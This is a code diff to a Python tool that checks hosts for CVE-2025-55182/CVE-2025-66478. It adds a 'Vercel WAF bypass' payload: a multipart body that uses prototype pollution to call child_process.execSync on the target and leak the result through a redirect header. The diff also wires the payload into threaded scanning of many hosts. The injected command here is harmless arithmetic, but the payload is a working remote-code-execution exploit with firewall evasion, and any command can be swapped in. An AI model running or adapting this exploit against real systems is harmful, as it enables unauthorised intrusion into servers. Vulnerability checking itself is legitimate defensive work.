@@ -107,6 +107,38 @@ def build_safe_payload() -> tuple[str, str]:
     return body, content_type
 
 
+def build_vercel_waf_bypass_payload() -> tuple[str, str]:
+    """Build the Vercel WAF bypass multipart form data payload."""
+    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+
+    part0 = (
+        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
+        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
+        '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;'
+        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
+        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
+    )
+
+    body = (
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="0"\r\n\r\n'
+        f"{part0}\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="1"\r\n\r\n'
+        f'"$@0"\r\n'
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="2"\r\n\r\n'
+        f"[]\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="3"\r\n\r\n'
+        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
+    )
+
+    content_type = f"multipart/form-data; boundary={boundary}"
+    return body, content_type
+
+
 def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
     """Build the RCE PoC multipart form data payload."""
     boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
@@ -203,10 +235,13 @@ def resolve_redirects(url: str, timeout: int, verify_ssl: bool, max_redirects: i
 def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool) -> tuple[requests.Response | None, str | None]:
     """Send the exploit payload to a URL. Returns (response, error)."""
     try:
+        # Encode body as bytes to ensure proper Content-Length calculation
+        # and avoid potential encoding issues with the HTTP client
+        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
         response = requests.post(
             target_url,
             headers=headers,
-            data=body,
+            data=body_bytes,
             timeout=timeout,
             verify=verify_ssl,
             allow_redirects=False
@@ -248,7 +283,7 @@ def is_vulnerable_rce_check(response: requests.Response) -> bool:
     return bool(re.search(r'.*/login\?a=11111.*', redirect_header))
 
 
-def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> dict:
+def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False) -> dict:
     """
     Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.
 
@@ -283,6 +318,9 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
     if safe_check:
         body, content_type = build_safe_payload()
         is_vulnerable = is_vulnerable_safe_check
+    elif vercel_waf_bypass:
+        body, content_type = build_vercel_waf_bypass_payload()
+        is_vulnerable = is_vulnerable_rce_check
     else:
         body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
         is_vulnerable = is_vulnerable_rce_check
@@ -532,6 +570,12 @@ Examples:
         help="Size of junk data in KB for WAF bypass (default: 128)"
     )
 
+    parser.add_argument(
+        "--vercel-waf-bypass",
+        action="store_true",
+        help="Use Vercel WAF bypass payload variant"
+    )
+
     args = parser.parse_args()
 
     if args.no_color or not sys.stdout.isatty():
@@ -574,6 +618,8 @@ Examples:
             print(colorize("[*] Windows mode enabled (PowerShell payload)", Colors.CYAN))
         if args.waf_bypass:
             print(colorize(f"[*] WAF bypass enabled ({args.waf_bypass_size}KB junk data)", Colors.CYAN))
+        if args.vercel_waf_bypass:
+            print(colorize("[*] Vercel WAF bypass mode enabled", Colors.CYAN))
         if args.insecure:
             print(colorize("[!] SSL verification disabled", Colors.YELLOW))
         print()
@@ -590,7 +636,7 @@ Examples:
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     if len(hosts) == 1:
-        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size)
+        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass)
         results.append(result)
         if not args.quiet or result["vulnerable"]:
             print_result(result, args.verbose)
@@ -599,7 +645,7 @@ Examples:
     else:
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
             futures = {
-                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size): host
+                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass): host
                 for host in hosts
             }
 
